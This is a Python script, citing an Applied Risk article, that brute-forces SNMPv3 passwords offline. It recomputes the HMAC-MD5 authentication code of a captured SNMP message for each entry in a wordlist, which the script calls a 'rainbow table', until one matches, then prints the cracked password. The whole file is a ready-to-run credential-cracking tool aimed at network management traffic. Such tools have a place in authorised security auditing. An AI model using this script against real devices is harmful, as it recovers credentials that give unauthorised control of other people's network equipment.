#src : https://applied-risk.com/resources/brute-forcing-snmpv3-authentication
import hashlib
import sys

def SNMPv3_compute_String1(passwordGuess):
    target_bits = 1048576
    if not passwordGuess:
        return None
    string1 = (passwordGuess * (target_bits // len(passwordGuess) + 1))[:target_bits]
    return string1

def SNMPv3_compute_authKey(passwordGuess, msgAuthoritativeEngineID, hashAlgorithm='MD5'):
    if not passwordGuess:
        return None
    string1 = SNMPv3_compute_String1(passwordGuess)
    digest1 = hashlib.md5(string1.encode()).hexdigest()
    string2 = bytes.fromhex(digest1) + bytes.fromhex(msgAuthoritativeEngineID) + bytes.fromhex(digest1)
    authKey = hashlib.md5(string2).hexdigest()
    return authKey

def SNMPv3_compute_ExtendedAuthKey(authKey):
    extendedAuthKey = bytes.fromhex(authKey) + b'\x00' * (128 - len(bytes.fromhex(authKey)))
    return extendedAuthKey

def SNMPv3_compute_wholeMsgMod(wholeMsg, msgAuthenticationParameters):
    wholeMsgMod = bytes.fromhex(wholeMsg.replace(msgAuthenticationParameters, '00' * 12))
    return wholeMsgMod

def SNMPv3_compute_MAC_MD5(passwordGuess, msgAuthoritativeEngineID, msgAuthenticationParameters, wholeMsg):
    hashAlgorithm = 'MD5'
    ipad = bytes([0x36] * 64)
    opad = bytes([0x5C] * 64)
    authKey = SNMPv3_compute_authKey(passwordGuess, msgAuthoritativeEngineID, hashAlgorithm)
    if not authKey:
        return None
    extendedAuthKey = SNMPv3_compute_ExtendedAuthKey(authKey)
    k1 = bytes([b1 ^ b2 for b1, b2 in zip(extendedAuthKey, ipad)])
    k2 = bytes([b1 ^ b2 for b1, b2 in zip(extendedAuthKey, opad)])
    wholeMsgMod = SNMPv3_compute_wholeMsgMod(wholeMsg, msgAuthenticationParameters)
    hashK1 = hashlib.md5(k1 + wholeMsgMod).digest()
    hashK2 = hashlib.md5(k2 + hashK1).hexdigest()
    mac = hashK2[:24]
    return mac

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("[x] Error : usage => sys.argv[0] <rainbow table> <wholeMsg> <msgAuthoritativeEngineID> <msgAuthenticationParameters>")
        sys.exit(1)
    rainbow_table = sys.argv[1]
    wholeMsg = sys.argv[2] 
    msgAuthoritativeEngineID = sys.argv[3]
    msgAuthenticationParameters = sys.argv[4]
    print("-" * 100)
    print("[***] Attempting to crack SNMPv3 password...")
    print(f"[INFO] MAC Target (msgAuthenticationParameters) : {msgAuthenticationParameters}")
    print("-" * 100)
    i = 0 
    try:
    	with open(rainbow_table, 'r', encoding='utf-8') as file:
        	i = 0
        	for line in file:
            		candidate = line.strip()
            		if len(candidate) == 0:
                		continue
            		sys.stdout.write("\r" + " " * 150 + "\r")
            		sys.stdout.write("\r	=> Testing candidate: {:<20}".format(candidate))
            		sys.stdout.flush()
            		MAC = SNMPv3_compute_MAC_MD5(candidate, msgAuthoritativeEngineID, msgAuthenticationParameters, wholeMsg)
            		sys.stdout.write("\n	=> Computed MAC: {:<32}".format(MAC))
            		sys.stdout.flush()
            		if MAC == msgAuthenticationParameters:
                		print("\n\n" + "-" * 100)
                		sys.stdout.write("[!!!] Password Cracked: {}\n".format(candidate))
                		sys.exit(0)
            		else:
                		i += 1
                		sys.stdout.write(f"\n	=> Candidate N°: {i}")
                		sys.stdout.write("\033[F\033[F")
                		sys.stdout.flush()
                    
    except FileNotFoundError:
        print(f"[x] Error : file {rainbow_table} not found.")
